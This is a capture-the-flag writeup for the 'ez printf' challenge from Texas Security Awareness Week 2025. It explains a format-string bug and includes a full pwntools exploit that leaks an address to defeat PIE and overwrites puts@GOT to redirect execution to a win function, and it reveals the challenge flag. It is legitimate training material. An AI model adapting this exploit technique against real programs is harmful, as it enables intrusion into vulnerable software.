---
title: "ez printf - Texas Security Awareness Week 2025"
category: "pwn"
subcategory: "format-string"
type: "writeup"
tags: ["pwn", "binary-exploitation", "format-string", "got-overwrite", "canary", "pie", "pwntools", "pwndbg", "lsb", "checksec", "texas-security-awareness-week", "texas-security-awareness-week-2025", "2025", "ctf-writeup"]
summary: "ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ..., for GNU/Linux 4.4.0, not stripped"
source:
  name: "CTFtime writeup #40161"
  url: "https://ctftime.org/writeup/40161"
ctf:
  name: "Texas Security Awareness Week 2025"
  year: 2025
  challenge: "ez printf"
---

## Metadata

- **CTF:** Texas Security Awareness Week 2025
- **Task:** ez printf
- **Author team:** H4ck_th3_Wh47
- **CTFtime tags:** pwn, binary-exploitation
- **CTFtime:** <https://ctftime.org/writeup/40161>

---
`file vuln`

```  
ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ..., for GNU/Linux 4.4.0, not stripped  
```

Checking for protections

`checksec --file=vuln`

```  
RELRO: Partial RELRO  
Stack: Canary found  
NX: NX enabled  
PIE: PIE enabled  
Stripped: No  
```

\-----

**Analysing **

let's decompile the binary

```  
read(0, buf, 120uLL);  
printf(buf);  
read(0, buf, 120uLL);  
printf(buf);  
puts("nice try");  
return 0;  
```

So, we can see that there is a clear **format string vulnerability** twice, since no format specifiers are passed to `printf`.

Further there is also a `win` function that prints the flag.

\-----

**Exploit**

1\. Use the first input to leak an address that points into the binary itself, which we'll use further to get runtime `win` function address (thereby Bypassing PIE protection).  
2\. Overwriting the GOT entry for `puts` with the dynamically resolved addr of the `win` function (GOT overwrite).

\-----

**Execution**

1\.   
```  
pwndbg> stack 20  
00:0000│ rsp 0x7fffffffd880 ◂— 'MYINPUT\n'  
01:0008│-078 0x7fffffffd888 ◂— 0x80000  
02:0010│-070 0x7fffffffd890 ◂— 0x8000  
03:0018│-068 0x7fffffffd898 —▸ 0x7fffffffd8c8 ◂— 0  
04:0020│-060 0x7fffffffd8a0 ◂— 0x6800000017  
05:0028│-058 0x7fffffffd8a8 ◂— 0  
... ↓ 7 skipped  
0d:0068│-018 0x7fffffffd8e8 —▸ 0x7ffff7fe5af0 (dl_main) ◂— endbr64   
0e:0070│-010 0x7fffffffd8f0 —▸ 0x7fffffffd9e0 —▸ 0x555555555090 (_start) ◂— endbr64   
0f:0078│-008 0x7fffffffd8f8 ◂— 0x34417aea34716e00  
10:0080│ rbp 0x7fffffffd900 —▸ 0x7fffffffd9a0 —▸ 0x7fffffffda00 ◂— 0  
```

`0x7fffffffd8f0 —▸ 0x7fffffffd9e0 —▸ 0x555555555090 (_start) ◂— endbr64` 

So there is 0x55.. address of `_start` which is pointing in the binary ( can also check using command `vmmap` in pwndbg ).

Inorder to access this address by printf we need to dereference 0x7fffffffd9e0 this for which we'll use %s format specifier and will further unpack the printied addr.

I found the offset to be 20, so initial payload: `%20$s`

2\. I usually prefer manually crafting the payload in case of overwriting via %n specifier because it took me long time to understand the working, but since here the addr to jump on was being dynamically resolved, I used the pwntools library function.

FINAL EXPLOIT:

```  
from pwn import *

debug = 0  
# context.log_level = 'debug'

elf = context.binary = ELF('./vuln1')

if debug:  
p = process(elf.path)  
else:  
p = remote('ip.ip.ip', port)

win_off = 0x1189  
offset = 6

p.recvline()  
p.sendline(b'%20$s')

leaked = p.recvline().strip().ljust(8, b'\x00')  
leaked_addr = u64(leaked)  
log.success(f"Leaked address: {hex(leaked_addr)}")

base = leaked_addr - elf.symbols['_start']  
win = base + win_off  
got_puts = base + elf.got['puts']

log.success(f"Base address: {hex(base)}")  
log.success(f"win function: {hex(win)}")  
log.success(f"puts@GOT : {hex(got_puts)}")

payload = fmtstr_payload(offset, {got_puts: win}, write_size='short') # this will construct the format string payload to overwrite got_puts with win 

p.sendline(payload)

p.interactive()  
p.recv()  
```

Flag: `texsaw{Pr1nt1ng_tHe_Fs_15_e4sy}`

\-----
